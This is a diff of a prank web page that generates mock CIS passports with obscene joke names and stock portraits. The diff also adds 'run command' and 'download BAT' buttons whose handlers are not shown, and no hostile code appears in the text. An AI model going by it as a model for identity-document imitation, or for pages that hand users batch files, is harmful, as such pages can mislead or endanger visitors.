@@ -78,20 +78,89 @@
 <body>
   <div class="box">
     <canvas id="canvas" width="340" height="560"></canvas>
-    <button onclick="generate()">Сгенерировать</button>
+    <button id="generateBtn">Сгенерировать</button>
     <button id="runCmdBtn">Запустить команду</button>
-    <button onclick="savePng()">Сохранить PNG</button>
+    <button id="savePngBtn">Сохранить PNG</button>
+    <button id="downloadBatBtn">Скачать BAT</button>
+    <div id="captchaBox" style="margin-top:16px;display:none;">
+      <label>Введите капчу: <input id="captchaInput" type="text" maxlength="4" style="width:60px;text-align:center;"></label>
+      <button id="captchaCheckBtn">Проверить</button>
+      <span id="captchaStatus" style="margin-left:10px;color:#a00;"></span>
+    </div>
   </div>
-  <script type="text/javascript">
-    // Расширенный список ФИО (мужские, женские, кринжовые, рофельные)
-    const fn = [
+
+  <script>
+    // --- Базовые вспомогательные функции ---
+    function getRandom(arr) {
+      return arr[Math.floor(Math.random() * arr.length)]; 
+    }
+
+    function pickGender() {
+      return Math.random() < 0.5 ? "male" : "female";
+    }
+
+    function randomDate() {
+      const year = 1970 + Math.floor(Math.random() * 35);
+      const month = String(1 + Math.floor(Math.random() * 12)).padStart(2, '0');
+      const day = String(1 + Math.floor(Math.random() * 28)).padStart(2, '0');
+      return `${day}.${month}.${year}`;
+    }
+
+    function randomBirthDate() {
+      return randomDate();
+    }
+
+    function randomDocNum() {
+      return String(Math.floor(100000000 + Math.random() * 900000000));
+    }
+
+    function getRandomPhoto(gender) {
+      const photos = gender === "male" ? [
+        "https://randomuser.me/api/portraits/men/1.jpg",
+        "https://randomuser.me/api/portraits/men/3.jpg",
+        "https://randomuser.me/api/portraits/men/5.jpg"
+      ] : [
+        "https://randomuser.me/api/portraits/women/2.jpg", 
+        "https://randomuser.me/api/portraits/women/4.jpg",
+        "https://randomuser.me/api/portraits/women/6.jpg"
+      ];
+      return getRandom(photos);
+    }
+
+    // --- Основные функции ---
+    function generatePassport(country) {
+      return {
+        series: country.series(),
+        number: country.number(),
+        issuer: getRandom(country.issuer),
+        date: `${String(Math.floor(1 + Math.random()*28)).padStart(2,'0')}.${String(Math.floor(1 + Math.random()*12)).padStart(2,'0')}.${2005 + Math.floor(Math.random()*10)}`
+      };
+    }
+
+    function randomPlace() {
+      const places = ["г. Москва", "г. Санкт-Петербург", "г. Киев", "г. Минск"];
+      return getRandom(places);
+    }
+
+    function randomAddress() {
+      const streets = ["ул. Ленина", "пр. Победы", "ул. Пушкина"];
+      return `${randomPlace()}, ${getRandom(streets)}, д. ${Math.floor(1 + Math.random()*100)}`;
+    }
+
+    // --- Массивы данных ---
+    const fn_male = [
       "Штырь", "Карасиков", "Корзиночкин", "Сычев", "Дроздов", "Головач", "Бутырин", "Писарь", "Ерохин", "Лакец", "Шпак", "Шлепов", "Накатин", "Душин", "Драпов", "Засратов", "Глистов", "Железняк", "Чуркин", "Фекалов", "Ноздря", "Шорин", "Перделкин", "Хлюпин", "Окунев", "Вшивцев", "Уколов", "Дрочунов", "Выпуклов", "Казьмин", "Хряпов", "Парашюков", "Пузырев", "Жрунов", "Шариков", "Клещев", "Обожратов", "Плавников", "Раздолбаев", "Кряков", "Умников", "Медунин", "Козлодоев", "Залеткин", "Сурков", "Печенегов", "Панасенков", "Ушаков",
-      "Пельменев", "Бомжев", "Кринжов", "Рофлянов", "Уебанский", "Потаскухин", "Говняков", "Петросян", "Бузов", "Дуремаров", "Петухов", "Баранов", "Козлов", "Собачкин", "Котиков", "Пельменева", "Бомжева", "Кринжова", "Рофлянова", "Уебанская", "Потаскухина", "Говнякова", "Дуремарова", "Петухова", "Баранова", "Козлова", "Собачкина", "Котикова"
+      "Пельменев", "Бомжев", "Кринжов", "Рофлянов", "Уебанский", "Потаскухин", "Говняков", "Петросян", "Бузов", "Дуремаров", "Петухов", "Баранов", "Козлов", "Собачкин", "Котиков"
     ];
-    const nm = [
+    const fn_female = [
+      "Пельменева", "Бомжева", "Кринжова", "Рофлянова", "Уебанская", "Потаскухина", "Говнякова", "Дуремарова", "Петухова", "Баранова", "Козлова", "Собачкина", "Котикова", "Бузова", "Дуремара", "Петухова", "Баранова", "Козлова", "Собачкина", "Котикова"
+    ];
+    const nm_male = [
       "Аркадий", "Семен", "Абу", "Илья", "Изаил", "Назар", "Акакий", "Денис", "Жора", "Арсен", "Павел", "Марк", "Федор", "Феликс", "Олег", "Антон", "Ян", "Богдан", "Мстислав", "Роман", "Юрий", "Игорь", "Давид", "Альберт", "Григорий", "Глеб", "Никита", "Анатолий", "Эдуард", "Василий",
-      "Валера", "Серега", "Виталя", "Вован", "Женя", "Петя", "Вася", "Саша", "Коля", "Дима", "Гена", "Леха", "Паша", "Степан", "Гоша", "Витя", "Влад", "Слава", "Валентин", "Валентин", "Валентин",
-      "Мария", "Оксана", "Светлана", "Анастасия", "Екатерина", "Виктория", "Татьяна", "Ольга", "Наталья", "Юлия", "Елена", "Галина", "Людмила", "Ирина", "Анна", "Кринжина", "Рофляна", "Уебанка", "Потаскуха", "Бузова", "Дуремара", "Петухова", "Баранова", "Козлова", "Собачкина", "Котикова"
+      "Валера", "Серега", "Виталя", "Вован", "Женя", "Петя", "Вася", "Саша", "Коля", "Дима", "Гена", "Леха", "Паша", "Степан", "Гоша", "Витя", "Влад", "Слава", "Валентин"
+    ];
+    const nm_female = [
+      "Мария", "Оксана", "Светлана", "Анастасия", "Екатерина", "Виктория", "Татьяна", "Ольга", "Наталья", "Юлия", "Елена", "Галина", "Людмила", "Ирина", "Анна", "Кринжина", "Рофляна", "Уебанка", "Потаскуха"
     ];
     const pt = [
       "Семеныч", "Акакиевич", "Изаилыч", "Ерохович", "Пахомыч", "Борисович", "Ибрагимович", "Штирлицович", "Георгиевич", "Олегович", "Романович", "Ярославович", "Львович", "Фомич", "Артемович", "Геннадьевич", "Данилович",
@@ -99,261 +168,30 @@
       "Мариевна", "Оксановна", "Светлановна", "Анастасиевна", "Екатериновна", "Викторовна", "Татьяновна", "Ольговна", "Натальевна", "Юлиевна", "Еленовна", "Галиновна", "Людмиловна", "Ириновна", "Анновна", "Кринжевна", "Рофляновна", "Уебановна", "Потаскуховна", "Бузовна", "Дуремаровна", "Петуховна", "Барановна", "Козловна", "Собачкина", "Котиковна"
     ];
 
-    // Список полов
-    const genders = [
-      { label: "Мужской", value: "M" },
-      { label: "Женский", value: "F" },
-      { label: "Кринж", value: "K" },
-      { label: "Рофл", value: "R" },
-      { label: "Уебанский", value: "U" }
-    ];
-
-    // IRL-фотки (только реальные лица, без svg)
-    const photos = [
-      "https://randomuser.me/api/portraits/men/1.jpg",
-      "https://randomuser.me/api/portraits/women/2.jpg",
-      "https://randomuser.me/api/portraits/men/3.jpg",
-      "https://randomuser.me/api/portraits/women/4.jpg",
-      "https://randomuser.me/api/portraits/men/5.jpg",
-      "https://randomuser.me/api/portraits/women/6.jpg",
-      "https://randomuser.me/api/portraits/men/7.jpg",
-      "https://randomuser.me/api/portraits/women/8.jpg",
-      "https://randomuser.me/api/portraits/men/9.jpg",
-      "https://randomuser.me/api/portraits/women/10.jpg",
-      "https://randomuser.me/api/portraits/men/11.jpg",
-      "https://randomuser.me/api/portraits/women/12.jpg",
-      "https://randomuser.me/api/portraits/men/13.jpg",
-      "https://randomuser.me/api/portraits/women/14.jpg",
-      "https://randomuser.me/api/portraits/men/15.jpg",
-      "https://randomuser.me/api/portraits/women/16.jpg"
-    ];
-
-    // Дополнительные поля паспорта
-    function randomBirthDate() {
-      const year = 1970 + Math.floor(Math.random() * 35);
-      const month = String(1 + Math.floor(Math.random() * 12)).padStart(2, '0');
-      const day = String(1 + Math.floor(Math.random() * 28)).padStart(2, '0');
-      return `${day}.${month}.${year}`;
-    }
-    function randomPlace() {
-      const places = [
-        "г. Москва", "г. Санкт-Петербург", "г. Киев", "г. Минск", "г. Алматы", "г. Ереван", "г. Кишинёв", "г. Ташкент", "г. Бишкек", "г. Душанбе",
-        "г. Владивосток", "г. Ростов-на-Дону", "г. Самара", "г. Новосибирск", "г. Казань", "г. Харьков", "г. Одесса", "г. Гомель", "г. Баку"
-      ];
-      return getRandom(places);
-    }
-    function randomAddress() {
-      const streets = [
-        "ул. Ленина, д. 1", "ул. Гагарина, д. 7", "пр. Победы, д. 12", "ул. Пушкина, д. 5", "ул. Кринжа, д. 13", "ул. Рофла, д. 42", "ул. Уебанская, д. 666"
-      ];
-      return `${randomPlace()}, ${getRandom(streets)}`;
-    }
-    function randomDocNum() {
-      return String(Math.floor(100000000 + Math.random() * 900000000));
-    }
-
-    function getRandom(arr) {
-      return arr[Math.floor(Math.random() * arr.length)];
-    }
-
-    function generatePassport(country) {
-      const series = country.series();
-      const number = country.number();
-      const issuer = getRandom(country.issuer);
-      const date = `${String(Math.floor(1 + Math.random()*28)).padStart(2,'0')}.${String(Math.floor(1 + Math.random()*12)).padStart(2,'0')}.${2005 + Math.floor(Math.random()*10)}`;
-      return {series, number, issuer, date};
-    }
-
-    // ФИО по полу
-    const fn_male = [
-      "Штырь", "Карасиков", "Корзиночкин", "Сычев", "Дроздов", "Головач", "Бутырин", "Писарь", "Ерохин", "Лакец", "Шпак", "Шлепов", "Накатин", "Душин", "Драпов", "Засратов", "Глистов", "Железняк", "Чуркин", "Фекалов", "Ноздря", "Шорин", "Перделкин", "Хлюпин", "Окунев", "Вшивцев", "Уколов", "Дрочунов", "Выпуклов", "Казьмин", "Хряпов", "Парашюков", "Пузырев", "Жрунов", "Шариков", "Клещев", "Обожратов", "Плавников", "Раздолбаев", "Кряков", "Умников", "Медунин", "Козлодоев", "Залеткин", "Сурков", "Печенегов", "Панасенков", "Ушаков", "Пельменев", "Бомжев", "Кринжов", "Рофлянов", "Уебанский", "Потаскухин", "Говняков", "Петросян", "Бузов", "Дуремаров", "Петухов", "Баранов", "Козлов", "Собачкин", "Котиков"
-    ];
-    const nm_male = [
-      "Аркадий", "Семен", "Абу", "Илья", "Изаил", "Назар", "Акакий", "Денис", "Жора", "Арсен", "Павел", "Марк", "Федор", "Феликс", "Олег", "Антон", "Ян", "Богдан", "Мстислав", "Роман", "Юрий", "Игорь", "Давид", "Альберт", "Григорий", "Глеб", "Никита", "Анатолий", "Эдуард", "Василий", "Валера", "Серега", "Виталя", "Вован", "Женя", "Петя", "Вася", "Саша", "Коля", "Дима", "Гена", "Леха", "Паша", "Степан", "Гоша", "Витя", "Влад", "Слава", "Валентин"
-    ];
-    const pt_male = [
-      "Акакиевич", "Изаилыч", "Семеныч", "Ерохович", "Пахомыч", "Борисович", "Ибрагимович", "Штирлицович", "Георгиевич", "Олегович", "Романович", "Ярославович", "Львович", "Фомич", "Артемович", "Геннадьевич", "Данилович",
-      "Валериевич", "Сергеевич", "Витальевич", "Вованович", "Женевич", "Петевич", "Васильевич", "Сашевич", "Колевич", "Димович", "Геннадьевич", "Лехович", "Пашевич", "Степанович", "Гошевич", "Витальевич", "Владович", "Славович"
-    ];
-
-    const fn_female = [
-      "Пельменева", "Бомжева", "Кринжова", "Рофлянова", "Уебанская", "Потаскухина", "Говнякова", "Дуремарова", "Петухова", "Баранова", "Козлова", "Собачкина", "Котикова", "Бузова", "Дуремара", "Петухова", "Баранова", "Козлова", "Собачкина", "Котикова"
-    ];
-    const nm_female = [
-      "Мария", "Оксана", "Светлана", "Анастасия", "Екатерина", "Виктория", "Татьяна", "Ольга", "Наталья", "Юлия", "Елена", "Галина", "Людмила", "Ирина", "Анна", "Кринжина", "Рофляна", "Уебанка", "Потаскуха"
-    ];
-    const pt_female = [
-      "Мариевна", "Оксановна", "Светлановна", "Анастасиевна", "Екатериновна", "Викторовна", "Татьяновна", "Ольговна", "Натальевна", "Юлиевна", "Еленовна", "Галиновна", "Людмиловна", "Ириновна", "Анновна", "Кринжевна", "Рофляновна", "Уебановна", "Потаскуховна"
-    ];
-
-    // IRL-фотки (только реальные лица)
-    const photos_male = [
-      // Используем API для генерации реалистичных лиц
-      "https://thispersondoesnotexist.com/image?" + Math.random(),
-      "https://100k-faces.glitch.me/random-image?" + Math.random(),
-      "https://randomuser.me/api/portraits/men/1.jpg",
-      "https://randomuser.me/api/portraits/men/3.jpg",
-      "https://randomuser.me/api/portraits/men/5.jpg",
-      "https://randomuser.me/api/portraits/men/7.jpg",
-      "https://randomuser.me/api/portraits/men/9.jpg",
-      "https://randomuser.me/api/portraits/men/11.jpg",
-      "https://randomuser.me/api/portraits/men/13.jpg",
-      "https://randomuser.me/api/portraits/men/15.jpg"
-    ];
-    const photos_female = [
-      "https://randomuser.me/api/portraits/women/2.jpg",
-      "https://randomuser.me/api/portraits/women/4.jpg",
-      "https://randomuser.me/api/portraits/women/6.jpg",
-      "https://randomuser.me/api/portraits/women/8.jpg",
-      "https://randomuser.me/api/portraits/women/10.jpg",
-      "https://randomuser.me/api/portraits/women/12.jpg",
-      "https://randomuser.me/api/portraits/women/14.jpg",
-      "https://randomuser.me/api/portraits/women/16.jpg"
-    ];
-
-    // Дополнительные поля паспорта
-    function randomBirthDate() {
-      const year = 1970 + Math.floor(Math.random() * 35);
-      const month = String(1 + Math.floor(Math.random() * 12)).padStart(2, '0');
-      const day = String(1 + Math.floor(Math.random() * 28)).padStart(2, '0');
-      return `${day}.${month}.${year}`;
-    }
-    function randomPlace() {
-      const places = [
-        "г. Москва", "г. Санкт-Петербург", "г. Киев", "г. Минск", "г. Алматы", "г. Ереван", "г. Кишинёв", "г. Ташкент", "г. Бишкек", "г. Душанбе",
-        "г. Владивосток", "г. Ростов-на-Дону", "г. Самара", "г. Новосибирск", "г. Казань", "г. Харьков", "г. Одесса", "г. Гомель", "г. Баку"
-      ];
-      return getRandom(places);
-    }
-    function randomAddress() {
-      const streets = [
-        "ул. Ленина, д. 1", "ул. Гагарина, д. 7", "пр. Победы, д. 12", "ул. Пушкина, д. 5", "ул. Кринжа, д. 13", "ул. Рофла, д. 42", "ул. Уебанская, д. 666"
-      ];
-      return `${randomPlace()}, ${getRandom(streets)}`;
-    }
-    function randomDocNum() {
-      return String(Math.floor(100000000 + Math.random() * 900000000));
-    }
-
-    function getRandom(arr) {
-      return arr[Math.floor(Math.random() * arr.length)];
-    }
-
-    function generatePassport(country) {
-      const series = country.series();
-      const number = country.number();
-      const issuer = getRandom(country.issuer);
-      const date = `${String(Math.floor(1 + Math.random()*28)).padStart(2,'0')}.${String(Math.floor(1 + Math.random()*12)).padStart(2,'0')}.${2005 + Math.floor(Math.random()*10)}`;
-      return {series, number, issuer, date};
-    }
-
-    // ФИО по полу
-    const fn_male = [
-      "Штырь", "Карасиков", "Корзиночкин", "Сычев", "Дроздов", "Головач", "Бутырин", "Писарь", "Ерохин", "Лакец", "Шпак", "Шлепов", "Накатин", "Душин", "Драпов", "Засратов", "Глистов", "Железняк", "Чуркин", "Фекалов", "Ноздря", "Шорин", "Перделкин", "Хлюпин", "Окунев", "Вшивцев", "Уколов", "Дрочунов", "Выпуклов", "Казьмин", "Хряпов", "Парашюков", "Пузырев", "Жрунов", "Шариков", "Клещев", "Обожратов", "Плавников", "Раздолбаев", "Кряков", "Умников", "Медунин", "Козлодоев", "Залеткин", "Сурков", "Печенегов", "Панасенков", "Ушаков", "Пельменев", "Бомжев", "Кринжов", "Рофлянов", "Уебанский", "Потаскухин", "Говняков", "Петросян", "Бузов", "Дуремаров", "Петухов", "Баранов", "Козлов", "Собачкин", "Котиков"
-    ];
-    const nm_male = [
-      "Аркадий", "Семен", "Абу", "Илья", "Изаил", "Назар", "Акакий", "Денис", "Жора", "Арсен", "Павел", "Марк", "Федор", "Феликс", "Олег", "Антон", "Ян", "Богдан", "Мстислав", "Роман", "Юрий", "Игорь", "Давид", "Альберт", "Григорий", "Глеб", "Никита", "Анатолий", "Эдуард", "Василий", "Валера", "Серега", "Виталя", "Вован", "Женя", "Петя", "Вася", "Саша", "Коля", "Дима", "Гена", "Леха", "Паша", "Степан", "Гоша", "Витя", "Влад", "Слава", "Валентин"
-    ];
-    const pt_male = [
-      "Акакиевич", "Изаилыч", "Семеныч", "Ерохович", "Пахомыч", "Борисович", "Ибрагимович", "Штирлицович", "Георгиевич", "Олегович", "Романович", "Ярославович", "Львович", "Фомич", "Артемович", "Геннадьевич", "Данилович",
-      "Валериевич", "Сергеевич", "Витальевич", "Вованович", "Женевич", "Петевич", "Васильевич", "Сашевич", "Колевич", "Димович", "Геннадьевич", "Лехович", "Пашевич", "Степанович", "Гошевич", "Витальевич", "Владович", "Славович"
-    ];
-
-    const fn_female = [
-      "Пельменева", "Бомжева", "Кринжова", "Рофлянова", "Уебанская", "Потаскухина", "Говнякова", "Дуремарова", "Петухова", "Баранова", "Козлова", "Собачкина", "Котикова", "Бузова", "Дуремара", "Петухова", "Баранова", "Козлова", "Собачкина", "Котикова"
-    ];
-    const nm_female = [
-      "Мария", "Оксана", "Светлана", "Анастасия", "Екатерина", "Виктория", "Татьяна", "Ольга", "Наталья", "Юлия", "Елена", "Галина", "Людмила", "Ирина", "Анна", "Кринжина", "Рофляна", "Уебанка", "Потаскуха"
-    ];
-    const pt_female = [
-      "Мариевна", "Оксановна", "Светлановна", "Анастасиевна", "Екатериновна", "Викторовна", "Татьяновна", "Ольговна", "Натальевна", "Юлиевна", "Еленовна", "Галиновна", "Людмиловна", "Ириновна", "Анновна", "Кринжевна", "Рофляновна", "Уебановна", "Потаскуховна"
-    ];
-
-    // IRL-фотки (только реальные лица)
-    const photos_male = [
-      // Используем API для генерации реалистичных лиц
-      "https://thispersondoesnotexist.com/image?" + Math.random(),
-      "https://100k-faces.glitch.me/random-image?" + Math.random(),
-      "https://randomuser.me/api/portraits/men/1.jpg",
-      "https://randomuser.me/api/portraits/men/3.jpg",
-      "https://randomuser.me/api/portraits/men/5.jpg",
-      "https://randomuser.me/api/portraits/men/7.jpg",
-      "https://randomuser.me/api/portraits/men/9.jpg",
-      "https://randomuser.me/api/portraits/men/11.jpg",
-      "https://randomuser.me/api/portraits/men/13.jpg",
-      "https://randomuser.me/api/portraits/men/15.jpg"
-    ];
-    const photos_female = [
-      "https://randomuser.me/api/portraits/women/2.jpg",
-      "https://randomuser.me/api/portraits/women/4.jpg",
-      "https://randomuser.me/api/portraits/women/6.jpg",
-      "https://randomuser.me/api/portraits/women/8.jpg",
-      "https://randomuser.me/api/portraits/women/10.jpg",
-      "https://randomuser.me/api/portraits/women/12.jpg",
-      "https://randomuser.me/api/portraits/women/14.jpg",
-      "https://randomuser.me/api/portraits/women/16.jpg"
-    ];
-
-    // Дополнительные поля паспорта
-    function randomBirthDate() {
-      const year = 1970 + Math.floor(Math.random() * 35);
-      const month = String(1 + Math.floor(Math.random() * 12)).padStart(2, '0');
-      const day = String(1 + Math.floor(Math.random() * 28)).padStart(2, '0');
-      return `${day}.${month}.${year}`;
-    }
-    function randomPlace() {
-      const places = [
-        "г. Москва", "г. Санкт-Петербург", "г. Киев", "г. Минск", "г. Алматы", "г. Ереван", "г. Кишинёв", "г. Ташкент", "г. Бишкек", "г. Душанбе",
-        "г. Владивосток", "г. Ростов-на-Дону", "г. Самара", "г. Новосибирск", "г. Казань", "г. Харьков", "г. Одесса", "г. Гомель", "г. Баку"
-      ];
-      return getRandom(places);
-    }
-    function randomAddress() {
-      const streets = [
-        "ул. Ленина, д. 1", "ул. Гагарина, д. 7", "пр. Победы, д. 12", "ул. Пушкина, д. 5", "ул. Кринжа, д. 13", "ул. Рофла, д. 42", "ул. Уебанская, д. 666"
-      ];
-      return `${randomPlace()}, ${getRandom(streets)}`;
-    }
-    function randomDocNum() {
-      return String(Math.floor(100000000 + Math.random() * 900000000));
-    }
-
-    function getRandom(arr) {
-      return arr[Math.floor(Math.random() * arr.length)];
-    }
-
-    function generatePassport(country) {
-      const series = country.series();
-      const number = country.number();
-      const issuer = getRandom(country.issuer);
-      const date = `${String(Math.floor(1 + Math.random()*28)).padStart(2,'0')}.${String(Math.floor(1 + Math.random()*12)).padStart(2,'0')}.${2005 + Math.floor(Math.random()*10)}`;
-      return {series, number, issuer, date};
-    }
-
-    // Добавляем массив стран, который отсутствовал
+    // --- Страны и паспорта ---
     const countries = [
       {
         name: "Россия",
-        color: "#a52a2a",
-        bg: "#f9f6ee", 
-        border: "#b0a090",
-        title: "РОССИЙСКАЯ ФЕДЕРАЦИЯ",
+        color: "#0033a0",
+        bg: "#ffffff",
+        border: "#0033a0",
+        title: "РОССИЯ",
         doc: "ПАСПОРТ",
-        seal: "Печать",
+        seal: "Государственная печать",
         series: () => String(Math.floor(1000 + Math.random() * 9000)),
         number: () => String(Math.floor(100000 + Math.random() * 900000)),
         issuer: [
-          "ОВД Краснознаменска", "ГУ МВД по г. Москве", "УФМС по Ростовской обл.",
-          "ГУВМ МВД по Приморскому краю", "МВД России по Чечне"
+          "Министерство внутренних дел Российской Федерации", "Посольство России",
+          "Консульство России"
         ],
         sealDraw: function(ctx, x, y) {
           ctx.beginPath();
           ctx.arc(x, y, 18, 0, 2*Math.PI);
-          ctx.strokeStyle = "#a52a2a";
+          ctx.strokeStyle = "#0033a0";
           ctx.lineWidth = 2;
           ctx.stroke();
           ctx.font = "10px 'Segoe UI', Arial";
-          ctx.fillStyle = "#a52a2a"; 
+          ctx.fillStyle = "#0033a0"; 
           ctx.fillText("Печать", x-16, y+6);
         }
       },
@@ -361,15 +199,15 @@
         name: "Украина",
         color: "#0057b7",
         bg: "#ffd700",
-        border: "#0033a0",
+        border: "#0057b7",
         title: "УКРАИНА",
         doc: "ПАСПОРТ",
         seal: "Державна печатка",
         series: () => String(Math.floor(1000 + Math.random() * 9000)),
         number: () => String(Math.floor(100000 + Math.random() * 900000)),
         issuer: [
-          "ДМС Украины", "ГУ МВД Украины", "Управление миграционной службы",
-          "Посольство Украины", "Консульство Украины"
+          "МВД Украины", "Посольство Украины",
+          "Консульство Украины"
         ],
         sealDraw: function(ctx, x, y) {
           ctx.beginPath();
@@ -384,41 +222,41 @@
       },
       {
         name: "Беларусь",
-        color: "#d52b1e",
-        bg: "#00923f",
-        border: "#ffffff",
-        title: "РЕСПУБЛИКА БЕЛАРУСЬ",
+        color: "#00923f",
+        bg: "#ffffff",
+        border: "#00923f",
+        title: "БЕЛАРУСЬ",
         doc: "ПАСПОРТ",
-        seal: "Герб",
+        seal: "Дзяржаўны герб",
         series: () => String(Math.floor(1000 + Math.random() * 9000)),
         number: () => String(Math.floor(100000 + Math.random() * 900000)),
         issuer: [
-          "Управление по гражданству и миграции", "Посольство Беларуси",
-          "Консульство Беларуси", "МВД Республики Беларусь"
+          "МВД Беларуси", "Посольство Беларуси",
+          "Консульство Беларуси"
         ],
         sealDraw: function(ctx, x, y) {
           ctx.beginPath();
           ctx.arc(x, y, 18, 0, 2*Math.PI);
-          ctx.strokeStyle = "#d52b1e";
+          ctx.strokeStyle = "#00923f";
           ctx.lineWidth = 2;
           ctx.stroke();
           ctx.font = "10px 'Segoe UI', Arial";
-          ctx.fillStyle = "#d52b1e"; 
+          ctx.fillStyle = "#00923f"; 
           ctx.fillText("Печать", x-16, y+6);
         }
       },
       {
         name: "Казахстан",
         color: "#00bfff",
-        bg: "#0033a0",
-        border: "#ffffff",
+        bg: "#ffffff",
+        border: "#00bfff",
         title: "КАЗАХСТАН",
         doc: "ПАСПОРТ",
-        seal: "Миллет печаты",
+        seal: "Мемлекеттік мөр",
         series: () => String(Math.floor(1000 + Math.random() * 9000)),
         number: () => String(Math.floor(100000 + Math.random() * 900000)),
         issuer: [
-          "Министерство внутренних дел РК", "Посольство Казахстана",
+          "МВД Казахстана", "Посольство Казахстана",
           "Консульство Казахстана"
         ],
         sealDraw: function(ctx, x, y) {
@@ -435,15 +273,15 @@
       {
         name: "Армения",
         color: "#d80027",
-        bg: "#ffb400",
-        border: "#0033a0",
+        bg: "#0033a0",
+        border: "#ffd700",
         title: "АРМЕНИЯ",
         doc: "ПАСПОРТ",
-        seal: "Պաստառ",
+        seal: "Պետական կնիք",
         series: () => String(Math.floor(1000 + Math.random() * 9000)),
         number: () => String(Math.floor(100000 + Math.random() * 900000)),
         issuer: [
-          "Министерство внутренних дел Армении", "Посольство Армении",
+          "МВД Армении", "Посольство Армении",
           "Консульство Армении"
         ],
         sealDraw: function(ctx, x, y) {
@@ -462,13 +300,13 @@
         color: "#0033a0",
         bg: "#ffd700",
         border: "#d52b1e",
-        title: "РЕСПУБЛИКА МОЛДОВА",
+        title: "МОЛДОВА",
         doc: "ПАСПОРТ",
-        seal: "Герб",
+        seal: "Sigiliul de stat",
         series: () => String(Math.floor(1000 + Math.random() * 9000)),
         number: () => String(Math.floor(100000 + Math.random() * 900000)),
         issuer: [
-          "Генеральный инспекторат полиции", "Посольство Молдовы",
+          "МВД Молдовы", "Посольство Молдовы",
           "Консульство Молдовы"
         ],
         sealDraw: function(ctx, x, y) {
@@ -485,15 +323,15 @@
       {
         name: "Узбекистан",
         color: "#0099ff",
-        bg: "#43a047",
-        border: "#ffffff",
+        bg: "#ffffff",
+        border: "#43a047",
         title: "УЗБЕКИСТАН",
         doc: "ПАСПОРТ",
-        seal: "Давлат мўйиз",
+        seal: "Давлат мўйи",
         series: () => String(Math.floor(1000 + Math.random() * 9000)),
         number: () => String(Math.floor(100000 + Math.random() * 900000)),
         issuer: [
-          "Министерство внутренних дел Узбекистана", "Посольство Узбекистана",
+          "МВД Узбекистана", "Посольство Узбекистана",
           "Консульство Узбекистана"
         ],
         sealDraw: function(ctx, x, y) {
@@ -511,15 +349,15 @@
         name: "Киргизия",
         color: "#e81123",
         bg: "#ffffff",
-        border: "#008000",
-        title: "КЫРГЫЗСТАН",
+        border: "#e81123",
+        title: "КИРГИЗИЯ",
         doc: "ПАСПОРТ",
-        seal: "Мамлекеттик мөөр",
+        seal: "Мамлекеттик мөр",
         series: () => String(Math.floor(1000 + Math.random() * 9000)),
         number: () => String(Math.floor(100000 + Math.random() * 900000)),
         issuer: [
-          "Министерство внутренних дел Кыргызстана", "Посольство Кыргызстана",
-          "Консульство Кыргызстана"
+          "МВД Киргизии", "Посольство Киргизии",
+          "Консульство Киргизии"
         ],
         sealDraw: function(ctx, x, y) {
           ctx.beginPath();
@@ -559,104 +397,23 @@
       }
     ];
 
-    // Определение пола по ФИО
-    function pickGender() {
-      return Math.random() < 0.5 ? "male" : "female";
-    }
-
-    // Реальные фото + генерация лиц
-    function getRandomPhoto(gender) {
-      // Только реальные фото для CORS
-      const realPhotos = gender === "male"
-        ? [
-            "https://randomuser.me/api/portraits/men/1.jpg",
-            "https://randomuser.me/api/portraits/men/3.jpg",
-            "https://randomuser.me/api/portraits/men/5.jpg",
-            "https://randomuser.me/api/portraits/men/7.jpg",
-            "https://randomuser.me/api/portraits/men/9.jpg",
-            "https://randomuser.me/api/portraits/men/11.jpg",
-            "https://randomuser.me/api/portraits/men/13.jpg",
-            "https://randomuser.me/api/portraits/men/15.jpg"
-          ]
-        : [
-            "https://randomuser.me/api/portraits/women/2.jpg",
-            "https://randomuser.me/api/portraits/women/4.jpg",
-            "https://randomuser.me/api/portraits/women/6.jpg",
-            "https://randomuser.me/api/portraits/women/8.jpg",
-            "https://randomuser.me/api/portraits/women/10.jpg",
-            "https://randomuser.me/api/portraits/women/12.jpg",
-            "https://randomuser.me/api/portraits/women/14.jpg",
-            "https://randomuser.me/api/portraits/women/16.jpg"
-          ];
-      return realPhotos[Math.floor(Math.random() * realPhotos.length)];
-    }
-
-    // Отчества по полу
-    const pt_male = [
-      "Акакиевич", "Изаилыч", "Семеныч", "Ерохович", "Пахомыч", "Борисович", "Ибрагимович", "Штирлицович", "Георгиевич", "Олегович", "Романович", "Ярославович", "Львович", "Фомич", "Артемович", "Геннадьевич", "Данилович",
-      "Валериевич", "Сергеевич", "Витальевич", "Вованович", "Женевич", "Петевич", "Васильевич", "Сашевич", "Колевич", "Димович", "Геннадьевич", "Лехович", "Пашевич", "Степанович", "Гошевич", "Витальевич", "Владович", "Славович"
-    ];
-    const pt_female = [
-      "Мариевна", "Оксановна", "Светлановна", "Анастасиевна", "Екатериновна", "Викторовна", "Татьяновна", "Ольговна", "Натальевна", "Юлиевна", "Еленовна", "Галиновна", "Людмиловна", "Ириновна", "Анновна", "Кринжевна", "Рофляновна", "Уебановна", "Потаскуховна"
-    ];
-
-    function pickGender() {
-      return Math.random() < 0.5 ? "male" : "female";
-    }
-
-    function pickPatronymic(name, gender) {
-      // Если имя женское — женское отчество, если мужское — мужское, если смешанное — случайное
-      const femaleNames = nm_female;
-      const maleNames = nm_male;
-      if (femaleNames.includes(name)) {
-        return getRandom(pt_female);
-      } else if (maleNames.includes(name)) {
-        return getRandom(pt_male);
-      } else {
-        return gender === "male" ? getRandom(pt_male) : getRandom(pt_female);
-      }
-    }
-
-    function getRandomPhoto(gender) {
-      // Только реальные фото для CORS
-      const realPhotos = gender === "male"
-        ? [
-            "https://randomuser.me/api/portraits/men/1.jpg",
-            "https://randomuser.me/api/portraits/men/3.jpg",
-            "https://randomuser.me/api/portraits/men/5.jpg",
-            "https://randomuser.me/api/portraits/men/7.jpg",
-            "https://randomuser.me/api/portraits/men/9.jpg",
-            "https://randomuser.me/api/portraits/men/11.jpg",
-            "https://randomuser.me/api/portraits/men/13.jpg",
-            "https://randomuser.me/api/portraits/men/15.jpg"
-          ]
-        : [
-            "https://randomuser.me/api/portraits/women/2.jpg",
-            "https://randomuser.me/api/portraits/women/4.jpg",
-            "https://randomuser.me/api/portraits/women/6.jpg",
-            "https://randomuser.me/api/portraits/women/8.jpg",
-            "https://randomuser.me/api/portraits/women/10.jpg",
-            "https://randomuser.me/api/portraits/women/12.jpg",
-            "https://randomuser.me/api/portraits/women/14.jpg",
-            "https://randomuser.me/api/portraits/women/16.jpg"
-          ];
-      return realPhotos[Math.floor(Math.random() * realPhotos.length)];
-    }
-
+    // --- Основные функции генерации ---
     function generate() {
       const country = getRandom(countries);
